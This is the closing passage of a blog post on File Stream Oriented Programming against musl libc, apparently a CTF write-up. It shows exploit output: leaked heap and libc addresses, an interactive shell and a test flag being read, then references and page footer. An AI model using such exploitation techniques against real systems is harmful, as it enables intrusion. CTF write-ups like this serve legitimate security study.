</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> hex<span style=color:#f92672>(</span>ofl_head<span style=color:#f92672>)</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0x7add684f8e88&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> hex<span style=color:#f92672>(</span>scanf_buf<span style=color:#f92672>)</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;0x7add684f72e8&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Switching to interactive mode
</span></span><span style=display:flex><span>$ ls
</span></span><span style=display:flex><span>chall
</span></span><span style=display:flex><span>flag.txt
</span></span><span style=display:flex><span>$ cat flag.txt
</span></span><span style=display:flex><span>flag<span style=color:#f92672>{</span>test<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>$
</span></span></code></pre></div><hr><h2 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h2><ol><li>musl source code - <a href=https://github.com/kraj/musl>https://github.com/kraj/musl</a></li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/fsop/>Fsop</a></li><li><a href=http://localhost:1313/tags/musl/>Musl</a></li><li><a href=http://localhost:1313/tags/pwn/>Pwn</a></li></ul><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share File Stream Oriented Programming (FSOP) on Musl Libc on x" href="https://x.com/intent/tweet/?text=File%20Stream%20Oriented%20Programming%20%28FSOP%29%20on%20Musl%20Libc&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fmusl-fsop-arkavidia-2025%2f&amp;hashtags=fsop%2cmusl%2cpwn"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share File Stream Oriented Programming (FSOP) on Musl Libc on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fmusl-fsop-arkavidia-2025%2f&amp;title=File%20Stream%20Oriented%20Programming%20%28FSOP%29%20on%20Musl%20Libc&amp;summary=File%20Stream%20Oriented%20Programming%20%28FSOP%29%20on%20Musl%20Libc&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2fmusl-fsop-arkavidia-2025%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share File Stream Oriented Programming (FSOP) on Musl Libc on reddit" href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fmusl-fsop-arkavidia-2025%2f&title=File%20Stream%20Oriented%20Programming%20%28FSOP%29%20on%20Musl%20Libc"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share File Stream Oriented Programming (FSOP) on Musl Libc on facebook" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fmusl-fsop-arkavidia-2025%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share File Stream Oriented Programming (FSOP) on Musl Libc on whatsapp" href="https://api.whatsapp.com/send?text=File%20Stream%20Oriented%20Programming%20%28FSOP%29%20on%20Musl%20Libc%20-%20http%3a%2f%2flocalhost%3a1313%2fposts%2fmusl-fsop-arkavidia-2025%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share File Stream Oriented Programming (FSOP) on Musl Libc on telegram" href="https://telegram.me/share/url?text=File%20Stream%20Oriented%20Programming%20%28FSOP%29%20on%20Musl%20Libc&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fmusl-fsop-arkavidia-2025%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share File Stream Oriented Programming (FSOP) on Musl Libc on ycombinator" href="https://news.ycombinator.com/submitlink?t=File%20Stream%20Oriented%20Programming%20%28FSOP%29%20on%20Musl%20Libc&u=http%3a%2f%2flocalhost%3a1313%2fposts%2fmusl-fsop-arkavidia-2025%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>Nouxia's Notes</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>